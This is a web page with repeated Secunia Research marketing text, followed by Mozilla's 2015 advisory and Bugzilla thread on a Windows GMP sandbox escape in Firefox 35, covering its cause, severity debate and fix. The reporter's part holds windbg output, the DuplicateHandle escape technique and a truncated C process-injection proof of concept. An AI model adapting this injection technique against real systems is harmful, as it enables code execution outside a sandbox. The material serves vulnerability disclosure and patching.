How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Mozilla Foundation Security Advisory 2015-07

## Gecko Media Plugin sandbox escape

Announced
January 13, 2015
Reporter
Nils
Impact
Critical
Products
Firefox
Fixed in

* Firefox 35

### Description

Security researcher **Nils** discovered a mechanism to break out
of the [Gecko Media
Plugin](https://wiki.mozilla.org/GeckoMediaPlugins) (GMP) sandbox on Windows systems. The GMP sandbox is currently only
used to host h.264 video playback using the OpenH264 plugin but is being
developed to host other other media plugins. This bug would allow an attacker to
escape or bypass the GMP sandbox if another exploitable bug is found in a GMP
media plugin which allowed them to compromise the GMP process.

This bugs only affects Windows systems. OS X and Linux systems
are not affected by it.

| [Description](/show_bug.cgi?id=1117140#c0)• 10 years ago |
|  | |

The sandboxed plugin-container.exe process on Windows holds a handle to the parent process. We can observe this in windbg:
0:007:x86> !handle 18c 1
Handle 18c
Type Process
0:007:x86> !handle 18c 2
Handle 18c
Attributes 0
GrantedAccess 0x101441:
Synch
HandleCount 9
PointerCount 283079
0:007:x86> !handle 18c 8
Handle 18c
Object Specific Information
Process Id 5868
Parent Process 1720
Base Priority 8
While the access rights on this handle are somewhat limited (0x101441) it still allows us to duplicate handles in the parent process (PROCESS\_DUP\_HANDLE). Using DuplicateHandle we can issue a call that duplicate the process handle from the parent process to our current process (-1 a pseudo handles to the parent and current (sandboxed process):
DuplicateHandle(0x18c, -1, -1, 0, 0, 0, 2)
The call will succeed and a new handle to the parent process is created in the sandboxed child. This handle has full access to the parent which then allows for executing arbitrary code in the parent through CreateRemoteThread:
0:007:x86> !handle 36c 1
Handle 36c
Type Process
0:007:x86> !handle 36c 2
Handle 36c
Attributes 0
GrantedAccess 0x1fffff:

0:007:x86> !handle 36c 8
Handle 36c
Object Specific Information
Process Id 5868
Parent Process 1720
Base Priority 8
This is a quick and dirty PoC which injects a "shellcode" into the sandboxed process (PID on the command line and address of DuplicateHandle and the Handle are currently hardcoded):
#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>

{
INT pid = \_wtoi(argv[1]);
printf("[-] Attaching to process %d\n", pid);
HANDLE hProcess = OpenProcess(PROCESS\_ALL\_ACCESS, TRUE, pid);
printf("[-] Process handle: 0x%x\n", hProcess);
VOID \*dllname = VirtualAllocEx(hProcess, NULL, sizeof(code), MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);
WriteProcessMemory(hProcess, dllname, (void\*)code, sizeof(code), NULL);
printf("[-] remote code: %x\n", dllname);

This is not necessarily the case on discussions with Dan Veditz and others. In fact, I believe we tend to rate them as sec-critical if they allow people to then do bad things.

Benjamin, I suspect it is an inherited handle from the parent process. On line <http://dxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#333> bInheritHandles seems to be true.
Are inherited handles being checked at startup currently? There might be others that could lead to break-outs.Flags: needinfo?(nils)

That looks like a bug. We should be passing an explicit list of handles to inherit via (and we are, at <http://dxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#309>) but then we end up passing true as bInherit, which will inherit all inheritable handles which may happen to be active in the process.
bobowen, can you look at this?

We can't have it both ways on the rating. You could make the argument that a sandbox escape by itself is not that harmful and should be moderate, but then we should be rating all the other bugs at full strength. If we're downrating other sec-critical bugs "because they're sandboxed" then the sandbox itself is a critical security feature. We've gone to the trouble of creating the sandbox on the assumption the boxed code has bugs, so the rating reflects [escape + assumed bug(s)] and not the escape alone.Flags: needinfo?(dveditz)Keywords: [sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

For the sandboxed process the handle inheritance code is here:
<http://dxr.mozilla.org/mozilla-central/source/security/sandbox/win/src/broker_services.cc#389>
Although it is very similar.
My understanding is that with the list specified it will only inherit handles on the list.
So, I'm not sure where this handle is coming from.
I think if you don't have inherit handles set to true then it won't inherit anything.
I'll try and test this.
Nils - at what point have you stopped the process in windbg?
Also, does Google Chrome have a similar handle to the parent process in its child processes?Flags: needinfo?(bobowencode) → needinfo?(nils)

Bob - I used this test page ( <http://mozilla.github.io/webrtc-landing/pc_test.html> ) with "Require H.264" checked and had the video stream running for a few seconds before attaching to the child.
The Google Chrome renderer or GPU child processes don't have any handles to processes.
I found a related discussion in the chromium bug tracker which suggests that bInheritHandles can be false if the handles are inherited explicitly:

Thanks Nils.
I'm not sure that's quite what the discussion is saying.
However, if this is causing the issue, maybe we can only inherit for debug builds or release builds with a runtime flag / env var.
I'm not sure how much time I'll have to look at this before Monday.

OK, if I try to set inherit handles to false the CreateProcessAsUserW call (in TargetProcess::Create) fails with an ERROR\_INVALID\_PARAMETER.
So, it seems like you have to have inherit handles as true if you want to pass a handle list to limit the inheritance.
I've also tried commenting out the inheritance code in BrokerServicesBase::SpawnTarget entirely and passing inherit handles as false.
The Process handles to the parent process still appear, so it must be something else that is doing this.
Trying to track it down at the moment, it is appears to be after this point at least:

In fact very shortly after that point, the handle is acquired initially here:
<http://dxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions.cpp#457>
Looks like it is copied (or re-acquired) three times for some reason shortly afterwards.

The others are newly acquired at:
<http://dxr.mozilla.org/mozilla-central/source/gfx/layers/ipc/CompositorChild.cpp#81>
<http://dxr.mozilla.org/mozilla-central/source/gfx/layers/ipc/ImageBridgeChild.cpp#578>
<http://dxr.mozilla.org/mozilla-central/source/ipc/glue/BackgroundImpl.cpp#1675>
This is for the content process, the GMP process only has the one from nsEmbedFunctions.
So, it looks like these handles need to be closed after they are no longer needed or maybe the permissions on them need to be tightened.

I don't know offhand what we use the handle for; I'd have to deep-dive in the history. I'm guessing that it's just a PID or something and we could easily refactor it to avoid the handle, but I don't know.

I can take this, although I'd like to figure out what the priority is because I have other pressing stuff I'm working on at the moment.
From my understanding we currently have a non-restrictive sandbox enabled in Nightly. I'm not sure if that's rolling out any time soon. Higher level restrictions are still being worked on.
So this should probably block general sandboxing rollout.Flags: needinfo?(jmathies)

This is most important in terms of the GMP sandbox which is already in production. The e10s sandbox could easily wait a while.

I think the thing we care most about right now is sandboxing the GMP process. So if we can get a fix for that in the short term, I think we can move on and worry about the general problem later. Right?

Examples of the use for logging can be found in obj-i686-pc-mingw32\ipc\ipdl\PGMPChild.cpp (on my machine).
Search for OtherProcess().
The handle is stored in mOtherProcess when Open (PGMPChild::Open) is called in GMPChild::Init.

We have a serious problem here that needs to be solved for content processes. The GMP plugin has the same problem, but as luck would have it we don't make use of the parent handle in this child process. With content processes we use the handle for creating transports that are initiated from the child side. We may use it for other things. The parent handle is cached in both the process object and the protocol object and can be accessed from either. It also appears we access it at random times during a run (see [comment 13](/show_bug.cgi?id=1117140#c13 "RESOLVED FIXED - GMP sandbox break-out on Windows through process handle")), so simply closing it out shortly after init breaks lots of stuff. Also, placing heavier restrictions on the parent handle doesn't solve it - if I remove PROCESS\_DUP\_HANDLE [1] rights, ipc Open calls start failing due to CreateTransport [2] failures.
GMP is an interest story. We still open and populate the parent handle via nsEmbedFunctions.cpp initialization code [3]. However in Fx36, we upped the security restrictions [4] on the gmp process, which caused base::OpenProcessHandle to fail. Thanks to a bug in chromium src [5], this failure went unnoticed. So currently on Nightly and Aurora we pass NULL to GMPProcessChild constructor [6], and apparently everything still works and all tests pass.
To work around this I think we need to:
- stop opening up that parent handle and pass NULL to GMPProcessChild() for all repos we are concerned about. Fx36 and higher should already be safe, but you wouldn't know it from looking at the code. [This needs to be confirmed.]
- fix that chromium bug so failures in base::OpenProcessHandle show up
- file a new sec bug on fixing this for all child processes the right way. Note, this looks like a pretty serious flaw in our ipc code, I do not know of a work around at this point.

Fixing base::OpenProcessHandle triggered a number of aborts in test runs related to failed OpenProcessHandle calls in various places in the code base.
I'm going to strip out the changes I've made in XRE\_InitChildProcess and just push a test run with the OpenProcessHandle bug fix to confirm. We'll have to sort this out first.

I am not bent, but it's for IPC actors that run on non-main threads.
> and does it need to run in content processes?
My understanding is that it does.
Having browsed the source a bit, I think what's going on here is that each top-level actor has an optional handle to the other process, which it needs on Windows in order to be able to send a file descriptor or shared memory object to it. Which means we'd need to be able to duplicate them, or change the code so a single handle can be shared (refcounted?), if we're going to create a new top-level actor that needs to send fds/shemems. (If it doesn't, it at least looks possible to use the three-argument Open() that sets mOtherProcess to kInvalidProcessHandle.)
I can believe that GMP doesn't need mOtherProcess for any actor, because the shmem handling was changed to always create them on the parent side due to interactions with Linux sandboxing (they're backed by temporary files), and I don't think there's any other fd/shmem usage in the protocols?

Sounds reasonable since this init code currently fails to duplicate the handle, yet all gmp tests succeed. (I do not know much about the gmp protocols.)
Another twist here, I've run a few of the failing tests locally on Win7, and I can't get them to fail in the same way as try. I might have jumped the gun a bit on blaming the PBackground code. I'm waiting on my last try push with just the OpenProcessHandle fix to see -

Hm, I have no idea what's going on with those failures...
PBackground is how we do all IndexedDB from both parent and child processes, and we have tons of tests running on windows in both child and parent process right now on tinderbox.
I applied your patch locally and everything continues to work, so I think there's something else going on there.

Maybe not assuming we feel confident these failures are try only, which at this point appears to be the case. If so we can skip the chromium fix for now and just land the handle fix. Posting that to try now to see what shows up.

Taking a step back, I don't think this fix does anything to mitigate this vulnerability. The problem here isn't the duplicated handle, it's the ability for a compromised GMP process to call OpenProcess successfully. If I had code execution in the GMP process, I could iterate PIDs in a call to OpenProcess until I hit on the right one, then from there I can pretty much do anything.
On Nightly, OpenProcess fails thanks to a sandbox upgrade and a restriction tightening ([bug 1041775](/show_bug.cgi?id=1041775 "RESOLVED FIXED - Update security/sandbox to upstream chromium sandbox code as of 25th July 2014"), [bug 1027902](/show_bug.cgi?id=1027902 "RESOLVED FIXED - Use `SetIntegrityLevel` to set initial GMP process integrity to \"low\" (in addition to using `SetDelayedIntegrityLevel` to set integrity to \"untrusted\" later)")). The sandbox upgrade landed 2014-11-26 (Fx36). So we are stuck with this vulnerability IMO in Fx35 and lower if we can't uplift these changes.

It is just the initial integrity level that was changed to low.
The integrity level once the sandbox is properly started is untrusted, so would certainly stop OpenProcess.
This is on release.
That said maybe we could uplift, not sure how painful it might be.

So just to confirm, to get OpenProcess to fail in beta we would have to uplift [bug 1027902](/show_bug.cgi?id=1027902 "RESOLVED FIXED - Use `SetIntegrityLevel` to set initial GMP process integrity to \"low\" (in addition to using `SetDelayedIntegrityLevel` to set integrity to \"untrusted\" later)")? Is there anything that you know of currently that prevents us from doing this?

After chatting bowen about sandbox features:
<bobowen> OpenProcess will already fail after the sandbox has been started
<bobowen> we have to allow higher permission initially to do other start up stuff
<bobowen> we start the sandbox just before we load the GMP Plugin (at least for the GMP Process)
<bobowen> if someone has control of the process before we start the sandbox, we're are sunk anyway
<bobowen> and I'm guessing this could only be achieved by a wider compromise of their system
<jimm> oh I see
<jimm> so, if we never open that handle and leave it around, we're ok later on?
<bobowen> yes
Apparently our sandbox has the ability to change restrictions just prior to loading user content. Which is set here -
<http://mxr.mozilla.org/mozilla-release/source/security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp#160>
So prior to user content getting loaded privileged code can call OpenProcess if it wants too, it just needs to clean up afterward so that there are no open handles left around. After user content is loaded, OpenProcess calls will fail due to the untrusted security level we have set mitigating my concern in [comment 34](/show_bug.cgi?id=1117140#c34 "RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"). This feature is currently working on release.
So, my original patch that avoids calling OpenProcess and exposing that handle actually will fix this vulnerability.

This is green on try. I will file follow ups on the chromium bug, the fallout from chromium bug fix, and fixing this open handle issue for processes that need the handle currently after user content loads.

mc handle fix
Approval Request Comment
[Feature/regressing bug #]:
Caused by long standing bugs in ipc code.
[User impact if declined]:
GMP media plugin sandbox integrity is compromised.
[Describe test coverage new/current, TBPL]:
Landed on mc 1/8/2015, try pushed listed in [comment 41](/show_bug.cgi?id=1117140#c41 "RESOLVED FIXED - GMP sandbox break-out on Windows through process handle").
[Risks and why]:
From what I understand about the GMP protocols this shouldn't regress anything. However we should give this some bake time on mc and QA needs to test GMP functionality as well before we roll out an official release with this.
[String/UUID change made/needed]:
none.

This should have gotten sec-approval before landing, because it is a sec-high or sec-critical bug that affects more than trunk. We're really late in beta so it may be too late to land this there, particularly for a patch that sounds like it has some risks.

fyi: lsblakk is planning to cut a new release candidate later today, but that means we'd have to land and ship this today.
Talking with jimm and jesup, the issue is getting some manual testing on this. I've added ehugg and drno to this bug who can us figure that out.
Per jimm in private irc: "what changed here had very little to do with what gmp actually does. what we did was take away a handle from ipc code that it would use to initiate connections to the browser from the plugin. afaik, gmp's protocol doesn't do that based on looking over the protocol spec."
So basically this is just closing a security vulnerability, not changing how gmp works.

It's also worth noting that, since [bug 1027902](/show_bug.cgi?id=1027902 "RESOLVED FIXED - Use `SetIntegrityLevel` to set initial GMP process integrity to \"low\" (in addition to using `SetDelayedIntegrityLevel` to set integrity to \"untrusted\" later)") landed on 27-11-2014, on Windows the call to base::OpenProcessHandle has been failing (silently) and we've been passing null to GMPProcessChild's constructor anyway.
It looks like this hasn't caused any problems on Nightly or Aurora since then.

mc handle fix
Talked this over in IRC with mreavy and we're going to take this in the 35.0 build 3 that is driven by [bug 1119189](/show_bug.cgi?id=1119189 "VERIFIED FIXED - FTE tour and room/call notifications are broken when Loop becomes unthrottled") so that we're not shipping with a sec-critical fix landed and exposed for 6 weeks in other branches. The manual testing done by jesup, ehugg, drno and mreavy (who know OpenH264 testing better than anybody else at Mozilla -- which is what's at risk here) provides the level of confidence needed to take this risk.

tested RC3 on Win7 (win32 build) with OpenH264 forced in pc\_test.html. Looks good. Previously had tested the Try builds including testing crashing the plugin (making sure it got handled right), multiple H.264 calls at once, etc. Tested Linux for good measure (should be (and was) unaffected).
